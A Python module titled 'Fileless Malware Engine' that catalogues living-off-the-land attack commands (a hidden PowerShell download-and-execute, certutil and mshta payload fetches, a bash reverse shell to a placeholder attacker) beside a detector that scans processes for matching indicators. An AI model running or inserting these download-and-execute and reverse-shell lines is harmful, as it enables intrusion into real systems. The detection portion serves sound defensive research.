"""Fileless Malware Engine"""
import os,json,subprocess,base64,hashlib

class LOLBinExecutor:
    """Living Off The Land Binary executor (research)"""
    TECHNIQUES={
        "powershell_download_exec":{"binary":"powershell.exe","args":"-nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload')\"","risk":"HIGH"},
        "certutil_download":{"binary":"certutil.exe","args":"-urlcache -split -f http://example.com/file.exe output.exe","risk":"HIGH"},
        "mshta_exec":{"binary":"mshta.exe","args":"javascript:a=GetObject(\"script:http://example.com/payload.sct\")","risk":"CRITICAL"},
        "bash_reverse":{"binary":"bash","args":"-i >& /dev/tcp/ATTACKER/PORT 0>&1","risk":"HIGH"},
        "python_exec":{"binary":"python3","args":"-c \"import os;os.system('id')\"","risk":"MEDIUM"},
    }
    
    def list_techniques(self):
        return {k:{"binary":v["binary"],"risk":v["risk"]} for k,v in self.TECHNIQUES.items()}
    
    def check_available_lolbins(self):
        available=[]
        for binary in ["powershell","cmd","bash","python3","perl","curl","wget","nc"]:
            try:
                subprocess.run(["which",binary],capture_output=True,timeout=5)
                available.append(binary)
            except: pass
        return available

class FilelessDetector:
    INDICATORS={
        "suspicious_parent_child":[("explorer.exe","powershell.exe"),("winword.exe","cmd.exe"),("outlook.exe","powershell.exe")],
        "suspicious_cmdlines":["IEX","Invoke-Expression","DownloadString","-enc","-encodedcommand","FromBase64String",
                               "Net.WebClient","Invoke-WebRequest","certutil -urlcache"],
        "memory_indicators":["VirtualAlloc","CreateRemoteThread","NtMapViewOfSection","RtlMoveMemory"],
    }
    
    def scan_processes(self):
        findings=[]
        try:
            result=subprocess.check_output(["ps","auxww"],text=True)
            for line in result.split("\n"):
                for indicator in self.INDICATORS["suspicious_cmdlines"]:
                    if indicator.lower() in line.lower():
                        findings.append({"process":line.strip()[:100],"indicator":indicator,"severity":"HIGH"})
        except: pass
        return findings
    
    def check_environment(self):
        findings=[]
        suspicious_vars=["COMSPEC","PSModulePath"]
        for var in suspicious_vars:
            val=os.environ.get(var,"")
            if val: findings.append({"variable":var,"value":val[:50],"severity":"INFO"})
        return findings
